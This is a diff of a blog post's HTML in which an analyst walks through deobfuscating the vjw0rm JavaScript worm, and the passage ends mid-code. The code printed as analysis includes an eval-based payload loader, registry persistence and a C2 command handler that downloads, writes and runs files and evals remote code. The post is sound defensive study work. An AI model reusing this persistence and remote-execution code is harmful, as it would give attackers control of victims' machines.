@@ -104,7 +104,7 @@
     
     
     "mainEntityOfPage": "true",
-    "wordCount": "2404"
+    "wordCount": "2400"
   }]
   </script>
 
@@ -496,7 +496,7 @@
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2022-11-29 00:00:00 &#43;0000 UTC">November 29, 2022</time><span class="px-2 text-primary-500">&middot;</span><span>2404 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">12 mins</span><span class="px-2 text-primary-500">&middot;</span>
+  <time datetime="2022-11-29 00:00:00 &#43;0000 UTC">November 29, 2022</time><span class="px-2 text-primary-500">&middot;</span><span>2400 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">12 mins</span><span class="px-2 text-primary-500">&middot;</span>
 
 
   
@@ -728,33 +728,30 @@ WScript.Quit(1);
     
 </h3><p>I returned to the script with renewed vigour, donned my glasses and ignored that giant chunk of text for the moment. The hot take I learned from my researching travels was to look out for <code>eval</code> statements, and <code>eval</code>s did I look for indeed!</p>
 <p>The original obfuscated sample contained one such statement at the end of the code.</p>
-<pre tabindex="0"><code>	xmlDOM[_2(254)] = _2(242), xmlDOM[_2(256)] = superString[_2(240)](/&lt;_/g, &#39;A&#39;);
-	comObject = WSH[_2(234)](_2(239));
-	if (!_$af1389800) {
-		_$af1389809();
-		_$af1389800 = 0;
-	}
-	;
-	comObject[_2(248)] = 1, comObject[_1(162)](), comObject[_2(244)](xmlDOM[_1(180)]), comObject[_2(237)] = 0, comObject[_8(458)] = 2, comObject[_2(247)] = _1(168), eval(comObject[_2(241)]());
-}());
-</code></pre><p><em>Figure 4: Eval statement in obfuscated nonsense</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>	<span style="color:#a6e22e">xmlDOM</span>[<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">254</span>)] <span style="color:#f92672">=</span> <span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">242</span>), <span style="color:#a6e22e">xmlDOM</span>[<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">256</span>)] <span style="color:#f92672">=</span> <span style="color:#a6e22e">superString</span>[<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">240</span>)](<span style="color:#e6db74">/&lt;_/g</span>, <span style="color:#e6db74">&#39;A&#39;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">comObject</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">WSH</span>[<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">234</span>)](<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">239</span>));
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">_$af1389800</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">_$af1389809</span>();
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">_$af1389800</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	;
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">comObject</span>[<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">248</span>)] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>, <span style="color:#a6e22e">comObject</span>[<span style="color:#a6e22e">_1</span>(<span style="color:#ae81ff">162</span>)](), <span style="color:#a6e22e">comObject</span>[<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">244</span>)](<span style="color:#a6e22e">xmlDOM</span>[<span style="color:#a6e22e">_1</span>(<span style="color:#ae81ff">180</span>)]), <span style="color:#a6e22e">comObject</span>[<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">237</span>)] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">comObject</span>[<span style="color:#a6e22e">_8</span>(<span style="color:#ae81ff">458</span>)] <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>, <span style="color:#a6e22e">comObject</span>[<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">247</span>)] <span style="color:#f92672">=</span> <span style="color:#a6e22e">_1</span>(<span style="color:#ae81ff">168</span>), eval(<span style="color:#a6e22e">comObject</span>[<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">241</span>)]());
+</span></span><span style="display:flex;"><span>}());
+</span></span></code></pre></div><p><em>Figure 4: Eval statement in obfuscated nonsense</em></p>
 <p>Now, the comobjects and xmlDOM should have immediately given away the fact I shouldn&rsquo;t use <code>console.log</code> in this instance to attempt deobfuscation of this script, however, in my gusto I did and thoroughly bamboozled myself for the next few hours, wondering why, exactly the script now hung when I ran it with nodejs. I ended up once again taking a break and pondering my existence and lifes choices a little longer before I arrived at the next attempt.</p>
 <p>comObject, you say? Well lets give wscript a crack and replace that <code>eval</code> statement with <code>WScript.Echo</code> and see what we get.</p>
 <p>I changed the code and opened up powershell.</p>
-<pre tabindex="0"><code>	xmlDOM[_2(254)] = _2(242), xmlDOM[_2(256)] = superString[_2(240)](/&lt;_/g, &#39;A&#39;);
-	comObject = WSH[_2(234)](_2(239));
-	if (!_$af1389800) {
-		_$af1389809();
-		_$af1389800 = 0;
-	}
-	;
-	comObject[_2(248)] = 1, comObject[_1(162)](), comObject[_2(244)](xmlDOM[_1(180)]), comObject[_2(237)] = 0, comObject[_8(458)] = 2, comObject[_2(247)] = _1(168), WScript.Echo(comObject[_2(241)]());
-}());
-
-# changing context to powershell
-
-cscript.exe ./vjw0rm_2.js
-</code></pre><p><em>Figure 5: Wscript replacement and powershell execution command</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>	<span style="color:#a6e22e">xmlDOM</span>[<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">254</span>)] <span style="color:#f92672">=</span> <span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">242</span>), <span style="color:#a6e22e">xmlDOM</span>[<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">256</span>)] <span style="color:#f92672">=</span> <span style="color:#a6e22e">superString</span>[<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">240</span>)](<span style="color:#e6db74">/&lt;_/g</span>, <span style="color:#e6db74">&#39;A&#39;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">comObject</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">WSH</span>[<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">234</span>)](<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">239</span>));
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">_$af1389800</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">_$af1389809</span>();
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">_$af1389800</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	;
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">comObject</span>[<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">248</span>)] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>, <span style="color:#a6e22e">comObject</span>[<span style="color:#a6e22e">_1</span>(<span style="color:#ae81ff">162</span>)](), <span style="color:#a6e22e">comObject</span>[<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">244</span>)](<span style="color:#a6e22e">xmlDOM</span>[<span style="color:#a6e22e">_1</span>(<span style="color:#ae81ff">180</span>)]), <span style="color:#a6e22e">comObject</span>[<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">237</span>)] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">comObject</span>[<span style="color:#a6e22e">_8</span>(<span style="color:#ae81ff">458</span>)] <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>, <span style="color:#a6e22e">comObject</span>[<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">247</span>)] <span style="color:#f92672">=</span> <span style="color:#a6e22e">_1</span>(<span style="color:#ae81ff">168</span>), <span style="color:#a6e22e">WScript</span>.<span style="color:#a6e22e">Echo</span>(<span style="color:#a6e22e">comObject</span>[<span style="color:#a6e22e">_2</span>(<span style="color:#ae81ff">241</span>)]());
+</span></span><span style="display:flex;"><span>}());
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>&gt; wscript.exe ./vjworm.js
+</span></span></code></pre></div><p><em>Figure 5: Wscript replacement and powershell execution command</em></p>
 <div id="interjection-the-folly-of-an-analyst" class="anchor">Interjection: The folly of an analyst></div>
 <h3 class="relative group">Interjection: The folly of an analyst 
     <span
@@ -810,121 +807,121 @@ cscript.exe ./vjw0rm_2.js
 <li>C2 communications</li>
 <li>Any additional functions of the malware</li>
 </ul>
-<pre tabindex="0"><code>var sh = Cr(0);
-var fs = Cr(1);
-var spl = &#39;|V|&#39;;
-var Ch = &#39;\\&#39;;
-var VN = &#39;9/21&#39; + &#39;_&#39; + Ob(6);
-var fu = WScript.ScriptFullName;
-var wn = WScript.ScriptName;
-var U;
-try {
-	U = sh.RegRead(g[2]);
-} catch (err) {
-	var sv = fu.split(&#39;\\&#39;);
-	if (&#39;:\\&#39; + sv[1] == &#39;:\\&#39; + wn) {
-		U = &#39;TRUE&#39;;
-		sh.RegWrite(g[2], U, g[5]);
-	} else {
-		U = &#39;FALSE&#39;;
-		sh.RegWrite(g[2], U, g[5]);
-	}
-}
-</code></pre><p><em>Figure 7: Hard to read, arguably still &lsquo;obfuscated&rsquo; script</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">sh</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Cr</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fs</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Cr</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">spl</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;|V|&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">Ch</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\\&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">VN</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;9/21&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;_&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">Ob</span>(<span style="color:#ae81ff">6</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fu</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">WScript</span>.<span style="color:#a6e22e">ScriptFullName</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wn</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">WScript</span>.<span style="color:#a6e22e">ScriptName</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">U</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">U</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">RegRead</span>(<span style="color:#a6e22e">g</span>[<span style="color:#ae81ff">2</span>]);
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">err</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">sv</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fu</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;\\&#39;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#e6db74">&#39;:\\&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">sv</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;:\\&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">wn</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">U</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;TRUE&#39;</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">RegWrite</span>(<span style="color:#a6e22e">g</span>[<span style="color:#ae81ff">2</span>], <span style="color:#a6e22e">U</span>, <span style="color:#a6e22e">g</span>[<span style="color:#ae81ff">5</span>]);
+</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">U</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;FALSE&#39;</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">RegWrite</span>(<span style="color:#a6e22e">g</span>[<span style="color:#ae81ff">2</span>], <span style="color:#a6e22e">U</span>, <span style="color:#a6e22e">g</span>[<span style="color:#ae81ff">5</span>]);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><em>Figure 7: Hard to read, arguably still &lsquo;obfuscated&rsquo; script</em></p>
 <p>To make reading this sample more confusing, global variables and arrays are defined at the beginning of this script making it harder to read. The variables that follow contain valiues that are very hard to make sense of. I worked logically through each function to change these values to make them easier to read. I have included examples of this in Figure 8 below.</p>
-<pre tabindex="0"><code>try {
-	reg_key_installed = sh.RegRead(&#39;HKCU\\vjw0rm&#39;);
-} catch (err) {
-	var sv = WScript.ScriptFullName.split(&#39;\\&#39;);
-	if (&#39;:\\&#39; + sv[1] == &#39;:\\&#39; + WScript.ScriptName) {
-		reg_key_exists = &#39;TRUE&#39;;
-		sh.RegWrite(&#39;HKCU\\vjw0rm&#39;, reg_key_installed, &#39;REG_SZ&#39;);
-	} else {
-		reg_key_exists = &#39;FALSE&#39;;
-		sh.RegWrite(&#39;HKCU\\vjw0rm&#39;, reg_key_installed, &#39;REG_SZ&#39;);
-	}
-}
-</code></pre><p><em>Figure 8: De-bamboozled, easier to read script showing persistence</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">reg_key_installed</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">RegRead</span>(<span style="color:#e6db74">&#39;HKCU\\vjw0rm&#39;</span>);
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">err</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">sv</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">WScript</span>.<span style="color:#a6e22e">ScriptFullName</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;\\&#39;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#e6db74">&#39;:\\&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">sv</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;:\\&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">WScript</span>.<span style="color:#a6e22e">ScriptName</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">reg_key_exists</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;TRUE&#39;</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">RegWrite</span>(<span style="color:#e6db74">&#39;HKCU\\vjw0rm&#39;</span>, <span style="color:#a6e22e">reg_key_installed</span>, <span style="color:#e6db74">&#39;REG_SZ&#39;</span>);
+</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">reg_key_exists</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;FALSE&#39;</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">RegWrite</span>(<span style="color:#e6db74">&#39;HKCU\\vjw0rm&#39;</span>, <span style="color:#a6e22e">reg_key_installed</span>, <span style="color:#e6db74">&#39;REG_SZ&#39;</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><em>Figure 8: De-bamboozled, easier to read script showing persistence</em></p>
 <p>Once this section of code is made readable it reveals the primary persistence mechanism for this variant of vjw0rm. The malware will check to see whether the registry value of <code>HKCU\\vjworm</code> is present.</p>
 <p>Note: you could name these variables whatever you want, I just named them something that made sense to my weird brain.</p>
 <p>I continued to move through the script, deobfuscating the commands as I went. This way I was able to make sense of the functions of the malware.</p>
-<pre tabindex="0"><code>do {
-	try {
-		var path = Pt(&#39;Vre&#39;, &#39;&#39;); // directory that is appended to the C2
-		path = path.split(spl);
-		if (path[0] === &#39;Cl&#39;) {
-			WScript.Quit(1);
-		}
-		if (path[0] === &#39;Sc&#39;) {    
-			var s2 = Ex(&#39;temp&#39;) + &#39;\\&#39; + path[2];
-			var fi = fs.CreateTextFile(s2, true);
-			fi.Write(path[1]);
-			fi.Close();
-			sh.run(s2);
-		}
-		if (path[0] === &#39;Ex&#39;) {
-			eval(path[1]);
-		}
-		if (path[0] === &#39;Rn&#39;) {
-			var ri = fs.OpenTextFile(WScript.ScriptFullName, 1);
-			var fr = ri.ReadAll();
-			ri.Close();
-			VN = VN.split(&#39;_&#39;);
-			fr = fr.replace(VN[0], path[1]);
-			var wi = fs.OpenTextFile(WScript.ScriptFullName, 2, false);
-			wi.Write(fr);
-			wi.Close();
-			sh.run(&#39;wscript.exe //B &#34;&#39; + WScript.ScriptFullName + &#39;&#34;&#39;);
-			WScript.Quit(1);
-		}
-		if (path[0] === &#39;Up&#39;) {
-			var s2 = Ex(&#39;temp&#39;) + &#39;\\&#39; + path[2];
-			var ctf = fs.CreateTextFile(s2, true);
-			var gu = path[1];
-			gu = gu.replace(&#39;|U|&#39;, &#39;|V|&#39;);
-			ctf.Write(gu);
-			ctf.Close();
-			sh.run(&#39;wscript.exe //B &#34;&#39; + s2 + &#39;&#34;&#39;, 6);
-			WScript.Quit(1);
-		}
-		if (path[0] === &#39;Un&#39;) {
-			var s2 = path[1];
-			var vdr = WScript.ScriptFullName;
-			var regi = &#39;Nothing!&#39;;
-			s2 = s2.replace(&#39;%f&#39;, WScript.ScriptFullName).replace(&#39;%n&#39;, WScript.ScriptName).replace(&#39;%sfdr&#39;, vdr).replace(&#39;%RgNe%&#39;, regi);
-			eval(s2);
-			WScript.Quit(1);
-		}
-		if (path[0] === &#39;RF&#39;) {
-			var s2 = Ex(&#39;temp&#39;) + &#39;\\&#39; + path[2];
-			var fi = fs.CreateTextFile(s2, true);
-			fi.Write(path[1]);
-			fi.Close();
-			sh.run(s2);
-		}
-</code></pre><p><em>Figure 9: Deobfuscated C2 commands</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">do</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">path</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Pt</span>(<span style="color:#e6db74">&#39;Vre&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>); <span style="color:#75715e">// directory that is appended to the C2
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">path</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">split</span>(<span style="color:#a6e22e">spl</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">path</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;Cl&#39;</span>) {
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">WScript</span>.<span style="color:#a6e22e">Quit</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">path</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;Sc&#39;</span>) {    
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">s2</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Ex</span>(<span style="color:#e6db74">&#39;temp&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\\&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">path</span>[<span style="color:#ae81ff">2</span>];
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fi</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">CreateTextFile</span>(<span style="color:#a6e22e">s2</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">fi</span>.<span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">path</span>[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">fi</span>.<span style="color:#a6e22e">Close</span>();
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">run</span>(<span style="color:#a6e22e">s2</span>);
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">path</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;Ex&#39;</span>) {
+</span></span><span style="display:flex;"><span>			eval(<span style="color:#a6e22e">path</span>[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">path</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;Rn&#39;</span>) {
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">ri</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">OpenTextFile</span>(<span style="color:#a6e22e">WScript</span>.<span style="color:#a6e22e">ScriptFullName</span>, <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ri</span>.<span style="color:#a6e22e">ReadAll</span>();
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">ri</span>.<span style="color:#a6e22e">Close</span>();
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">VN</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">VN</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;_&#39;</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">fr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fr</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#a6e22e">VN</span>[<span style="color:#ae81ff">0</span>], <span style="color:#a6e22e">path</span>[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wi</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">OpenTextFile</span>(<span style="color:#a6e22e">WScript</span>.<span style="color:#a6e22e">ScriptFullName</span>, <span style="color:#ae81ff">2</span>, <span style="color:#66d9ef">false</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">wi</span>.<span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">fr</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">wi</span>.<span style="color:#a6e22e">Close</span>();
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">run</span>(<span style="color:#e6db74">&#39;wscript.exe //B &#34;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">WScript</span>.<span style="color:#a6e22e">ScriptFullName</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#34;&#39;</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">WScript</span>.<span style="color:#a6e22e">Quit</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">path</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;Up&#39;</span>) {
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">s2</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Ex</span>(<span style="color:#e6db74">&#39;temp&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\\&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">path</span>[<span style="color:#ae81ff">2</span>];
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">ctf</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">CreateTextFile</span>(<span style="color:#a6e22e">s2</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">gu</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">path</span>[<span style="color:#ae81ff">1</span>];
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">gu</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">gu</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#39;|U|&#39;</span>, <span style="color:#e6db74">&#39;|V|&#39;</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">ctf</span>.<span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">gu</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">ctf</span>.<span style="color:#a6e22e">Close</span>();
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">run</span>(<span style="color:#e6db74">&#39;wscript.exe //B &#34;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">s2</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#34;&#39;</span>, <span style="color:#ae81ff">6</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">WScript</span>.<span style="color:#a6e22e">Quit</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">path</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;Un&#39;</span>) {
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">s2</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">path</span>[<span style="color:#ae81ff">1</span>];
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">vdr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">WScript</span>.<span style="color:#a6e22e">ScriptFullName</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">regi</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Nothing!&#39;</span>;
